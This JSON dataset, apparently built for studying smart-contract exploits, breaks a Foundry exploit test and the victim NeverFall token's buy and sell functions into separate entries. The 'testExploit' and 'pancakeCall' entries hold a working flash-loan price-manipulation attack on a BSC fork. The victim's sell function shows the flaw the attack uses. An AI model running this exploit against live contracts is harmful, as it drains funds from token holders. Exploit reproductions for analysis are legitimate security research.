[
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "pancakeCall",
    "original_code": "    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {\n        uint256 usdtBalance = IERC20(usdt).balanceOf(address(this));\n        IERC20(usdt).approve(neverFall, type(uint256).max);\n        IERC20(usdt).approve(router, type(uint256).max);\n        // buy neverfall\n        INeverFall(neverFall).buy(200_000 * 1e18);\n        bscSwap(usdt, neverFall, 1_400_000 * 1e18);\n        // sell neverfall\n        INeverFall(neverFall).sell(75_500_000 * 1e18);\n\n        IERC20(usdt).transfer(msg.sender, usdtBalance + usdtBalance * 30 / 10_000);\n        emit log_named_decimal_uint(\"[After Attacks]  Attacker usdt balance\", IERC20(usdt).balanceOf(address(this)), 18);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"bsc\", 27_863_178 - 1);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        uint256 flashLoanAmount = 1_600_000 * 1e18;\n        IUniswapV2Pair(busd_usdt_pool).swap(flashLoanAmount, 0, address(this), new bytes(1));\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "INeverFall",
    "source_type": "victim_contract",
    "function_name": "buy",
    "original_code": "    function buy(uint256 amountU) public returns(uint256){\n        require(startBuy,\"not start\");\n        //\u6536usdt\n        IERC20(usdtAddress).safeTransferFrom(msg.sender,address(this),amountU);\n\n        uint256 beforeLiquidityAmount = balanceOf(address(this));\n        //90%\u52a0\u6c60\u5b50\n        IERC20(usdtAddress).approve(uniswapV2Router,amountU);\n        addLiquidity(initSupply, amountU * buyAddLiqFee / 100);\n        uint256 afterLiquidityAmount = balanceOf(address(this));\n        //5%\u7684usdt\u8d2d\u4e70\n        buySwap(amountU * buySwapFee / 100);\n        super._transfer(address(this), msg.sender, beforeLiquidityAmount - afterLiquidityAmount - balanceOf(pairTempAddress)); \n        super._transfer(pairTempAddress, address(this), balanceOf(pairTempAddress));\n        //\u8425\u9500\n        IERC20(usdtAddress).safeTransfer(marketingAddress,amountU * buyMarketingFee / 100);\n        emit BuyNF(msg.sender,amountU);\n        return beforeLiquidityAmount - afterLiquidityAmount - balanceOf(pairTempAddress);\n    } \n\n    event SellNF(address indexed account,uint256 indexed amount,uint256 indexed amountU);\n    event Reward(address indexed account,uint256 amount);\n\n",
    "description": ""
  },
  {
    "contract/interface": "INeverFall",
    "source_type": "victim_contract",
    "function_name": "sell",
    "original_code": "    function sell(uint256 amount) public returns(uint256){\n        super._transfer(msg.sender, address(this), amount);\n        //\u64a4\u6c60\u5b50 \u9000\u7ed9\u7528\u6237U\n        uint256 balanceNF = this.balanceOf(uniswapV2Pair);\n        uint256 pairTotalSupply = IERC20(uniswapV2Pair).totalSupply();\n        uint256 needLiquidity = amount * pairTotalSupply / balanceNF;\n        \n        uint256 beforeU = IERC20(usdtAddress).balanceOf(address(this));\n        removeLiquidity(needLiquidity,amount * 90 / 100,0);\n        uint256 afterU = IERC20(usdtAddress).balanceOf(address(this));\n        uint256 outU =  afterU - beforeU;\n\n        IERC20(usdtAddress).safeTransfer(msg.sender, outU * sellFee / 100);\n         //\u8425\u9500\n        IERC20(usdtAddress).safeTransfer(marketingAddress,outU * sellMarketingFee / 100);\n        emit SellNF(msg.sender,amount,outU);\n        return outU * sellFee / 100;  \n    }\n\n\n",
    "description": ""
  }
]